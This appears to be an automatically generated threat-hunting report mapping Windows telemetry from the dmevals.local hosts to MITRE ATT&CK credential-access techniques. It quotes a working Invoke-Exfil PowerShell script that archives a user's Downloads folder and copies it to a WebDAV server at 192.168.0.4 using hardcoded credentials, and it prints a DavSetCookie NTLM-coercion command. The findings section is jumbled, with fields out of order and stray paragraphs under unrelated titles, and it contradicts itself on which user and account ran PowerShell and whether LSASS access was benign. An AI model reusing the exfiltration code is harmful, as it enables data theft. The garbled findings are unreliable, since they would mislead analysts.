hypothesis: An adversary who compromised Windows hosts in this network stole credentials from them (MITRE ATT&CK tactic: Credential Access).

frame.restated: An adversary with existing access to Windows hosts on this network is stealing credentials from those hosts.
frame.what_would_confirm: Observable evidence such as LSASS process memory access (e.g., via Mimikatz or procdump), suspicious access to SAM/SECURITY registry hives, NTDS.dit extraction, credential dumping tool execution, or anomalous authentication events indicating credential theft.
frame.what_would_refute: Absence of credential dumping tool execution, no unauthorized access to LSASS or credential stores, no suspicious registry hive or NTDS.dit access, and no anomalous authentication events consistent with stolen credentials.

verdict.rule: Confirmed if >=1 in-scope incident of verified malicious findings (confidence >= medium); Inconclusive if only suspicious incidents or coverage gaps; Refuted if full coverage and no malicious/suspicious finding

T1003.name: OS Credential Dumping
T1003.reason: New host nashua.dmevals.local shows the same credential-access tooling chain: PsExec (PSEXESVC.exe) staging a PyInstaller python.exe that drops Rar.exe/sdelete64.exe and drives PowerShell credential-file harvesting.

T1003.001.name: LSASS Memory
T1003.001.reason: New corroborating event: powershell.exe (pbeesly) opened scranton lsass.exe with AccessMask 0x10 (PROCESS_VM_READ) at 03:05:16, matching the anchored LSASS-dump pattern; no new dump file observed in this window.

T1003.002.name: Security Account Manager
T1003.002.reason: No SAM/SECURITY hive file access, reg save, or 4663 SAM/SECURITY object access found.

T1003.003.name: NTDS
T1003.003.reason: No ntds.dit file access or vssadmin/ntdsutil/diskshadow activity found.

T1003.004.name: LSA Secrets
T1003.004.reason: 4662 LSA SecretObject queries are routine LOCAL SERVICE reads of Policy\Secrets\$MACHINE.ACC; no adversary LSA Secrets dumping.

T1003.005.name: Cached Domain Credentials
T1003.005.reason: No access to SECURITY\Cache objects or cachedump/dcc2 script blocks found.

T1003.006.name: DCSync
T1003.006.reason: No drsuapi/dcsync/lsadump activity; the only DS 4662 was a machine-account Control Access, not replication.

T1040.name: Network Sniffing
T1040.reason: The single packet-capture event (netsh trace start capture=yes on scranton.dmevals.local, 2020-05-02T03:19:17Z) was executed as SYSTEM by the Microsoft Azure NetworkWatcherAgent service, followed by netsh trace stop and hnetmon.dll load, alongside Azure WaAppAgent logman trace cycles. No third-party sniffing tools, no pcap/npcap/winpcap driver loads, and no attacker-controlled process or user were observed; this is expected Azure Network Watcher diagnostic capture.

T1056.name: Input Capture
T1056.reason: PowerShell.exe (PID 2976, SYSTEM) opened lsass.exe with GrantedAccess 0x1fffff (PROCESS_ALL_ACCESS) on scranton.dmevals.local at 03:05:16, in the same session that ran the keylogger/screen-capture toolkit.

T1056.001.name: Keylogging
T1056.001.reason: Get-Keystrokes invoked by user pbeesly on scranton.dmevals.local, preceded by a Keystroke-Check AV-evasion function; classic PowerShell keylogger.

T1056.002.name: GUI Input Capture
T1056.002.reason: Invoke-ScreenCapture (looping virtual-screen screenshots) and Get-Clipboard executed in the same pbeesly session on scranton.dmevals.local.

T1056.003.name: Web Portal Capture
T1056.003.reason: All web-portal capture checks (C071-C073, C075) returned zero hits; no aspx/php/wwwroot/login artifacts.

T1056.004.name: Credential API Hooking
T1056.004.reason: No SetWindowsHookEx/GetAsyncKeyState strings in script blocks or command lines, and no lsass/MiniDump/procdump messages in windows.other (C084 zero hits).

T1110.name: Brute Force
T1110.reason: No failed-logon events (4625/4771) exist in the data; the only 4776 NTLM validation is a success (win.Status 0x0). No brute-force tooling or authentication-failure pattern was found.

T1110.001.name: Password Guessing
T1110.001.reason: No 4625 failures and no processes launched with password arguments for logon attempts; PowerShell 'Password'/'Credential' hits are hardcoded secrets for cert export and WebDAV copy, not guessing.

T1110.002.name: Password Cracking
T1110.002.reason: No hashcat/john/crack execution and no wordlist/potfile/hash file creation. LSASS full-access handles from PowerShell (0x1f3fff/0x1fffff) indicate credential dumping (T1003), not offline cracking.

T1110.003.name: Password Spraying
T1110.003.reason: No 4625/4771 failures and no one-password-many-accounts pattern; the 4648 explicit-credential logons are a single account (pbeesly) via PSEXESVC lateral movement.

T1110.004.name: Credential Stuffing
T1110.004.reason: No failed authentication events at all, so no stuffing attempts; the single 4776 validation is a success for pbeesly.

T1111.name: Multi-Factor Authentication Interception
T1111.reason: No MFA-interception artifacts in any dataset: LSASS access is benign svchost/AV reads (GrantedAccess 0x1000, 286 events), no smartcard/OTP/token-theft tooling, no credential-provider or MFA registry tampering, and no PowerShell script blocks referencing MFA/OTP/smartcard/keylog. Observed activity (PsExec with cleartext creds, python.exe beaconing to 192.168.0.4:8443, token-attribute enumeration via Sysinternals readme.ps1) is credential use/enumeration, not MFA interception.

T1187.name: Forced Authentication
T1187.reason: On scranton.dmevals.local, user pbeesly's PowerShell session created a StartUp .lnk and downloaded OfficeSupplies.7z, then repeatedly ran 'rundll32.exe davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' — the canonical WebDAV forced-authentication primitive. Zeek confirms WebDAV OPTIONS/PROPFIND traffic from 10.0.1.4 to 192.168.0.4:80 with user-agent Microsoft-WebDAV-MiniRedir/10.0.18362 returning 401 Unauthorized, i.e. NTLM credential coercion against an attacker-controlled WebDAV server.

T1212.name: Exploitation for Credential Access
T1212.reason: No exploitation of a software vulnerability for credential access was found. All 326 LSASS process-access events are benign (svchost.exe 0x1000; Azure AntimalwareConfig.exe/WindowsAzureTelemetryService.exe 0x1400; wininit/services at boot). No credential-dumping tools or exploit binaries in any command line; only lsass.exe executes lsass. Kerberos 4768/4769 events are all successful normal ticket requests. The observed pbeesly PowerShell activity (discovery, persistence, screen capture, exfil, PsExec/SeaDuke lateral movement to NASHUA) is post-exploitation, not T1212 exploitation for credential access.

T1539.name: Steal Web Session Cookie
T1539.reason: No access to or copying of browser cookie/session stores (Cookies, Login Data, WebCache) was found in windows.security (4663), windows.sysmon (file-create 11, process-create 1) or windows.powershell (4104). The only cookie-related events are WebDAV davclnt.dll DavSetCookie calls tied to the Invoke-Exfil WebDAV exfiltration script, and browser-internal Edge RecoveryStore/DataStore temp files - neither is web session cookie theft.

T1552.name: Unsecured Credentials
T1552.reason: New on nashua: staged python.exe (PyInstaller) beaconing to 192.168.0.4:8443 orchestrates the credential-file collection and archive staging.

T1552.001.name: Credentials In Files
T1552.001.reason: New on nashua: PowerShell recursively collects *pass*/*login*/*admin*/*vpn/*.pst/*.ost files from the user profile into working.zip, then Rar.exe re-archives it with a hardcoded password.

T1552.002.name: Credentials in Registry
T1552.002.reason: No access to credential-bearing registry values (DefaultPassword, AutoAdminLogon, SAM/SECURITY) was seen; only routine Winlogon/Lsa system writes.

T1552.003.name: Shell History
T1552.003.reason: No ConsoleHost_history/PSReadLine/shell history access or file creation was observed in any dataset.

T1552.004.name: Private Keys
T1552.004.reason: Confirmed on scranton: powershell.exe wrote C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx at 03:04:57, consistent with the anchored private-key certificate export.

T1552.006.name: Group Policy Preferences
T1552.006.reason: SYSVOL GptTmpl.inf reads were performed by machine accounts (SCRANTON$, NASHUA$) applying Group Policy, not Groups.xml cpassword harvesting.

T1555.name: Credentials from Password Stores
T1555.reason: PowerShell.exe (SYSTEM) on scranton.dmevals.local opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff (PROCESS_ALL_ACCESS) at 03:05:16Z, the rare outlier among 326 mostly-benign 0x1000 LSASS accesses; consistent with credential-store memory access but no dumping tool command line observed.

T1555.003.name: Credentials from Web Browsers
T1555.003.reason: All browser credential-store checks (command lines, 4663 object access, PowerShell script blocks, other channel) returned zero hits; the only file-creation hit was an unrelated INetCookies file.

T1555.004.name: Windows Credential Manager
T1555.004.reason: LSASS handle access is dominated by benign system processes (svchost, Defender, CollectGuestLogs) with 0x1000/0x10 masks; no cmdkey or vault command lines observed.

T1555.005.name: Password Managers
T1555.005.reason: All KeePass/1Password/Bitwarden/LastPass checks (process execution, kdbx files, process access, PowerShell script blocks, service installs) returned zero hits.

T1556.name: Modify Authentication Process
T1556.reason: No authentication-process modification found. LSASS accesses are dominated by legitimate svchost.exe (0x1000) and AV/telemetry agents; no LSA registry writes, no auth DLL replacement, no service installs targeting auth components. Rare full-access PowerShell LSASS reads are credential-dumping (T1003) behaviour, not T1556.

T1556.001.name: Domain Controller Authentication
T1556.001.reason: Only Microsoft-signed modules (lsass.exe, samsrv.dll, wdigest.dll) loaded into lsass on the DCs; no unexpected DLL loads, no 4657 writes to lsass/cryptdll/wdigest/SecurityProviders, no 7045 service installs referencing auth components.

T1556.002.name: Password Filter DLL
T1556.002.reason: No registry writes to Notification Packages / PasswordFilter / LSA keys and no service installs with password/filter image paths. Only routine WMI Autologger and SystemCertificates 4657 writes by the machine account.

T1556.005.name: Reversible Encryption
T1556.005.reason: Zero 4739/4738/5136/5137/5141 events; no reversible-encryption or AllowReversiblePasswordEncryption activity in PowerShell, Sysmon or service installs.

T1556.006.name: Multi-Factor Authentication
T1556.006.reason: All 4624 logons use standard logon processes (Kerberos/Advapi/User32/NtLmSsp) and Kerberos authentication package; no 4739 policy changes or MFA-related cmdlets observed.

T1556.007.name: Hybrid Identity
T1556.007.reason: No directory-service object change events (5136/5137/5141) in windows.security or windows.other; no hybrid/federated identity configuration modification.

T1556.008.name: Network Provider DLL
T1556.008.reason: No registry writes to NetworkProvider / SecurityProviders / Winlogon keys; the 4657 events present were WMI Autologger and SystemCertificates writes.

T1557.name: Adversary-in-the-Middle
T1557.reason: No adversary-in-the-middle activity found. The suspicious activity in the window (PSEXESVC spawning C:\Windows\Temp\python.exe connecting to 192.168.0.4:8443 on nashua) is lateral movement/C2, not interception.

T1557.001.name: Name Resolution Poisoning and SMB Relay
T1557.001.reason: SMB connections all target internal hosts (10.0.0.4 DC, 10.0.1.6); zeek SMB is routine IPC$/sysvol/DRS traffic; DNS is normal AD resolution. No SMB relay or name-resolution poisoning.

T1557.002.name: ARP Cache Poisoning
T1557.002.reason: Each zeek source MAC maps to a single source IP; no MAC claiming multiple IPs, so no ARP cache poisoning signature.

T1557.003.name: DHCP Spoofing
T1557.003.reason: No DHCP events (1341/1342/1020/1063, UDP 5156, dhcp/netsh/route-add) and no UDP 67/68 traffic observed.

T1558.name: Steal or Forge Kerberos Tickets
T1558.reason: LSASS was accessed with full-read access (0x1F3FFF) by PowerShell on scranton and wsmprovhost on nashua, consistent with credential dumping that could yield Kerberos material, but no actual ticket theft/forgery artifacts were observed.

T1558.001.name: Golden Ticket
T1558.001.reason: No forged TGT indicators; all 4769/4768 events are normal successful RC4 Kerberos traffic on newyork.dmevals.local.

T1558.002.name: Silver Ticket
T1558.002.reason: No forged service tickets; 4769 service requests target only machine accounts and krbtgt with normal success.

T1558.003.name: Kerberoasting
T1558.003.reason: No RC4 TGS requests for user service accounts and no kerberoasting tooling in command lines.

T1558.004.name: AS-REP Roasting
T1558.004.reason: All 4768 AS-REQs show PreAuthType 2 (pre-auth enabled); no AS-REP roasting tooling observed.

T1606.name: Forge Web Credentials
T1606.reason: No forged web credential activity. PowerShell 4104 token/cookie/SAML keyword hit is the benign Sysinternals readme.ps1 Get-AttributesMask helper; logon stack is normal Kerberos/Advapi; 7045/5857/5858 events are PsExec/Java service installs and routine RSOP WMI operations.

T1606.001.name: Web Cookies
T1606.001.reason: Only cookie-store file is a benign Windows service-profile INetCookies created by svchost. No forged/stolen web cookie artifacts. The suspicious cod.3aka3.scr implant is C2 behaviour, not cookie forging.

T1606.002.name: SAML Tokens
T1606.002.reason: No SAML assertion or token-forging artifacts in PowerShell script blocks (only Sysinternals/DSC modules) and no SAML HTTP requests in Zeek; Kerberos traffic is normal TGT/TGS issuance.

T1621.name: Multi-Factor Authentication Request Generation
T1621.reason: No MFA request generation activity found. The only hit-bearing check (C316) returned routine WMI provider events (5857/5858) and PsExec service installs (7045), not MFA requests. All MFA-specific checks were empty: no 4625 failed logons (C314/C315), no MFA/2FA/Authenticator PowerShell script blocks (C317), no MFA/2FA command lines in sysmon (C318), no mfa/auth/otp/2fa HTTP URLs in zeek (C319). Independent searches for MFA/OTP/OneTime/Authenticator in PowerShell and for mfa/auth/otp/2fa URLs in zeek also returned zero. The observed activity is PsExec-based lateral movement by user pbeesly, unrelated to T1621.

T1649.name: Steal or Forge Authentication Certificates
T1649.reason: Confirmed on scranton: .pfx certificate file written by PowerShell (coyn5igj.3io.pfx), matching the anchored LocalMachine private-key export.

function Invoke-Exfil {

    if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershell -Force }

    Write-Host "[*] Compressing all the things in download dir"
    Compress-7Zip -Path "$env:USERPROFILE\Downloads\" -Filter * -Password "lolol" -ArchiveFileName "$env:APPDATA\OfficeSupplies.7z"

    $UserName = "cozy"
    $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare = "WebDavShare"
    $uri = "\\192.168.0.4\webdav"

    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
    
    Write-Host "[*] Creating a temporary mapped network drive - WebDavShare"
    New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds

    Write-Host "[*] Copying data to WebDavShare"
    Copy-Item "$env:APPDATA\OfficeSupplies.7z" "WebDavShare:\OfficeSupplies.7z" -Force

    Write-Host "[*] Removing temporary network share"
    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue

    Invoke-BeachCleanup
}

findings.title: Credential-access tooling staged via PsExec and hidden PowerShell on compromised hosts
findings.summary: The environment shows hands-on-keyboard credential-access tradecraft: PsExec64.exe and PSEXESVC.exe were executed on nashua.dmevals.local (PSEXESVC service installed repeatedly by user pbeesly), and a hidden PowerShell loader ran on scranton.dmevals.local. These are the staging mechanisms surrounding the LSASS access. No standalone credential-dumping binary (mimikatz/procdump/comsvcs) was observed on disk, so the dumping appears to be performed in-memory via PowerShell.

evidence.value:

findings.title: LSASS memory accessed with PROCESS_ALL_ACCESS by hidden PowerShell loader on scranton
findings.summary: On scranton.dmevals.local, a PowerShell process (PID 2976, user DMEVALS\pbeesly, IntegrityLevel High) was spawned by control.exe with a hidden window and execution-policy bypass, decoding a steganographic payload from C:\Users\pbeesly\Downloads\monkey.png and IEX-ing it. Seconds later the same PowerShell process opened a handle to lsass.exe (PID 736) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) and 0x1F3FFF, the access mask used to read LSASS memory for credential dumping. Windows Security 4663 confirms powershell.exe accessing \Device\HarddiskVolume2\Windows\System32\lsass.exe as pbeesly at the same time. A second host, nashua.dmevals.local, shows wsmprovhost.exe (PowerShell Remoting) opening lsass.exe with 0x1F3FFF with a call trace through Microsoft.PowerShell.Commands.Management, consistent with a PowerShell-based LSASS dump.

findings.title: PowerShell opens LSASS with PROCESS_ALL_ACCESS (0x1FFFFF) on scranton
findings.summary: At 2020-05-02T03:05:16.654Z on scranton.dmevals.local, PowerShell.exe (PID 2976, running as SYSTEM, S-1-5-18) opened a handle to C:\windows\system32\lsass.exe (PID 736) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS), preceded 31 ms earlier by a 0x1f3fff access. This is the same interactive attacker session (user pbeesly) that minutes later ran the keylogger and screen-capture toolkit; full-access LSASS handles are used for credential/input capture (e.g. dumping or hooking LSASS). The call trace shows ntdll/KERNELBASE with an UNKNOWN module, consistent with injected/reflective code rather than a normal signed consumer.

findings.title: PowerShell keylogger (Get-Keystrokes) executed on scranton by user pbeesly
findings.summary: On 2020-05-02 between 03:06:47 and 03:07:36 UTC, on host scranton.dmevals.local, user pbeesly (DMEVALS\pbeesly, SID S-1-5-21-1830255721-3727074217-2423397540-1107) ran an interactive PowerShell session (PID 3852) that loaded an attacker toolkit from C:\Program Files\SysinternalsSuite\psversion.ps1. The toolkit defines a Keystroke-Check function that enumerates AV/EDR processes (avp, acs, outpost, mcvsescn, mcods, navapsvc, kav, AvastSvc, AvastUi, nod32krn, nod32, ekern, dwengine, MsMpEng, msseces, ekrn, savservice, scfservice, savadminservice) — classic keylogger anti-detection — and then invokes Get-Keystrokes, sleeping 15 seconds and reading the 'Keystrokes' job output. This is input capture (keylogging) on the compromised host.

findings.title: Screen capture and clipboard harvesting in the same attacker PowerShell session
findings.summary: In the same scranton.dmevals.local session (user pbeesly, PID 3852) at 03:05:53 the toolkit defined Invoke-ScreenCapture, which loops taking screenshots of the virtual screen via System.Windows.Forms/System.Drawing into $env:USERPROFILE\Downloads, and at 03:06:42 the operator ran Get-Clipboard to harvest clipboard contents. These are GUI input/display capture actions consistent with collecting credentials and sensitive data from the interactive desktop. No fake credential dialog (CredUIPromptForCredentials) was observed, so this is GUI capture rather than a spoofed prompt.

findings.title: WebDAV forced authentication via rundll32 davclnt.dll DavSetCookie on scranton.dmevals.local
findings.summary: On scranton.dmevals.local, in the context of user DMEVALS\pbeesly, PowerShell created a StartUp shortcut (hostui.lnk) and downloaded OfficeSupplies.7z, then repeatedly executed 'rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' (03:08:50 and 03:10:22-23). DavSetCookie is the canonical WebDAV forced-authentication primitive: it makes the WebClient service authenticate to an attacker-controlled WebDAV server, leaking the user's NTLM credentials. Zeek corroborates the coercion: host 10.0.1.4 issued WebDAV OPTIONS/PROPFIND requests to 192.168.0.4:80 with user-agent 'Microsoft-WebDAV-MiniRedir/10.0.18362', receiving 401 Unauthorized (NTLM challenge) responses, including a PROPFIND for /webdav/OfficeSupplies.7z. This is attacker-driven credential coercion, not normal system behaviour.

It is part of a coherent Azure platform maintenance sequence on that host: the NetworkWatcherAgent service started at 03:19:13.877Z (parent services.exe), netsh 'trace start capture=yes' wrote an .etl to C:\windows\TEMP\E7116ECA-...\B91E06C5-....etl, netsh loaded the Windows capture helper hnetmon.dll, and netsh 'trace stop' ran at 03:19:24.835Z. In the same window the Azure guest agent (WaAppAgent.exe) drove logman trace create/start/stop cycles for GAEvents and RTEvents. No third-party sniffing tools (tcpdump/windump/wireshark/dumpcap/pktmon/rawcap) were observed, no pcap/npcap/winpcap driver loads were found, and no attacker-controlled process or user was involved. This is expected Azure Network Watcher diagnostic capture, not credential-access network sniffing.

Across windows.security, windows.sysmon, windows.powershell and windows.other (2020-05-02 02:55-03:28Z) there is no evidence of brute-force authentication. All failed-logon queries returned zero hits: event.code:4625 (Windows logon failure) and event.code:4771 (Kerberos pre-auth failure) matched nothing. No reads/writes of credential-storage values such as DefaultPassword, AutoAdminLogon, or cached credential blobs were observed, and the targeted checks for reg query/save/export and SAM/SECURITY/Credentials object access returned no hits.

findings.title: SYSVOL GptTmpl.inf reads by machine accounts are normal GPO application
findings.summary: Security EventID 5145 shows reads of dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf from the \\*\SYSVOL share on newyork.dmevals.local. The accessing accounts are machine accounts SCRANTON$ and NASHUA$ (domain-joined computers applying Group Policy), not interactive users, and the file is GptTmpl.inf (security template), not Groups.xml with a cpassword. This is routine Group Policy processing, not Group Policy Preferences credential harvesting.

All browser-credential checks returned zero hits: no process command lines referencing Login Data, logins.json, key3.db/key4.db or signons.sqlite (C192), no 4663 object access to those files (C193), no PowerShell script blocks referencing them (C194), and no other-channel events (C195). The single file-creation hit (C191) is an unrelated INetCookies file under a LocalService package path, not a browser credential store. No evidence of web-browser credential theft.
findings.title: No browser credential-store access observed

findings.summary: The 326 Sysmon event.code 10 accesses to lsass.exe are overwhelmingly benign: 293 use GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION) from svchost.exe, Windows Defender (MsMpEng.exe) and CollectGuestLogs.exe. findings.summary: All password-manager checks returned zero hits: no KeePass/1Password/Bitwarden/LastPass process executions (C203), no kdbx command lines (C204), no kdbx/1password/bitwarden file creations (C205), no process access to those targets (C206), no PowerShell script blocks referencing kdbx/KeePass/1Password (C207), and no service installs of those binaries (C208). findings.summary: 326 Sysmon event.code 10 accesses to lsass.exe were observed across utica, scranton and newyork. These are normal Windows/AV behaviours. No modification of the authentication process (no LSA registry writes, no auth DLL replacement, no service installs targeting auth components) was found.
findings.title: LSASS handle access dominated by legitimate system processes; no authentication-process modification observed

findings.summary: On the DCs (scranton, newyork, nashua, utica) the only modules loaded into lsass.exe were Microsoft-signed (lsass.exe, samsrv.dll, wdigest.dll, SignatureStatus Valid). No unexpected DLL was loaded into lsass, no 4657 registry write to lsass/cryptdll/wdigest/SecurityProviders, and no 7045 service install referencing lsass/cryptdll. findings.title: No domain-controller authentication tampering; LSASS module loads are Microsoft-signed

findings.summary: Searches for registry writes to Notification Packages / PasswordFilter / LSA keys (4657) and for service installs with password/filter image paths (7045) returned no hits. incidents.title: Credential-access tooling staged via PsExec and hidden PowerShell on compromised hosts
incidents.rationale: F02 describes the staging mechanisms surrounding the LSASS access: PsExec64.exe/PSEXESVC.exe executed on nashua.dmevals.local and a hidden PowerShell loader on scranton.dmevals.local, with no standalone credential-dumping binary on disk, indicating in-memory dumping via PowerShell. This is the credential-access staging action, best mapped to T1003 (OS Credential Dumping).

incidents.title: LSASS memory access with PROCESS_ALL_ACCESS by hidden PowerShell loader on scranton
incidents.rationale: All six findings describe the same attacker action: PowerShell.exe (PID 2976) on scranton.dmevals.local opening lsass.exe (PID 736) with GrantedAccess 0x1f3fff and 0x1fffff (PROCESS_ALL_ACCESS) at 2020-05-02T03:05:16Z, the access mask used to read LSASS memory for credential dumping. F01, F10, F26, F37, F42 and F56 share the same LSASS handle events (AaFHM31uOFchItTka0Gm/AaFHM31uOFchItTka0Gj) and the same host/process context; F37 explicitly notes this is credential dumping rather than authentication-process modification, and F42 notes no Kerberos ticket theft was observed. The best-fitting in-scope technique is T1003.001 (LSASS Memory).

incidents.title: PowerShell keylogger (Get-Keystrokes) executed on scranton by user pbeesly
incidents.rationale: F09 describes an interactive PowerShell session (PID 3852) on scranton.dmevals.local loading an attacker toolkit from C:\Program Files\SysinternalsSuite\psversion.ps1 and running Get-Keystrokes, i.e. capturing keystrokes. This is keylogging, best mapped to T1056.001.

incidents.title: Screen capture and clipboard harvesting in the attacker PowerShell session on scranton
incidents.rationale: F11 describes the same scranton session defining Invoke-ScreenCapture (screenshots via System.Windows.Forms/System.Drawing) and running Get-Clipboard to harvest clipboard contents, i.e. GUI input/display capture. Best mapped to T1056.002 (GUI Input Capture).

incidents.title: WebDAV forced authentication via rundll32 davclnt.dll DavSetCookie on scranton
incidents.rationale: F18 describes PowerShell creating a StartUp shortcut and repeatedly executing 'rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav', the canonical WebDAV forced-authentication primitive that leaks the user's NTLM credentials to an attacker-controlled server. Best mapped to T1187 (Forced Authentication).

incidents.title: PyInstaller python.exe staged via PsExec on nashua beacons to 192.168.0.4:8443 and drives the harvesting chain
incidents.rationale: F55 describes the PyInstaller python.exe on nashua.dmevals.local launched by PSEXESVC.exe, beaconing to 192.168.0.4:8443 and dropping Rar.exe/sdelete64.exe and spawning the PowerShell session that performed credential-file harvesting. This is the tooling staging the credential theft, best mapped to T1552 (Unsecured Credentials).

incidents.title: PowerShell Invoke-Exfil script with embedded plaintext credentials and archive of Downloads
incidents.rationale: F23 describes the Invoke-Exfil function on scranton.dmevals.local containing hardcoded plaintext username 'cozy' and password 'MyCozyPassw0rd!' used to map a WebDAV share, plus compression of the Downloads folder. The credential-access element is credentials stored in files/scripts, best mapped to T1552.001 (Credentials In Files).

incidents.title: PowerShell on nashua harvests credential-named files across user profile into password-protected archive
incidents.rationale: F53 describes a PowerShell script on nashua.dmevals.local recursively enumerating the user profile for credential-related filename patterns (*psw*, *pass*, *login*, *admin*, *vpn, *.pst, *.ost, *.txt, *.lnk, etc.) and compressing them into working.zip. This is searching local files for unsecured credentials, best mapped to T1552.001 (Credentials In Files).

incidents.title: Rar.exe on nashua creates password-protected archive of harvested files, then sdelete wipes artifacts
incidents.rationale: F54 describes Rar.exe on nashua.dmevals.local creating a password-protected archive of the harvested credential-named files, followed by sdelete64.exe anti-forensic cleanup. The credential-access action is the collection of unsecured credentials into the archive, best mapped to T1552.001 (Credentials In Files).

incidents.title: PowerShell Get-PrivateKeys exported all LocalMachine certificates to .pfx files
incidents.rationale: F22 and F51 describe the same action on scranton.dmevals.local: the Get-PrivateKeys function (loaded from the masquerading path C:\Program Files\SysinternalsSuite\readme.ps1) enumerating cert:\LocalMachine and calling Export-PfxCertificate to write .pfx files into the user's Downloads folder. This is theft of private keys, best mapped to T1552.004.
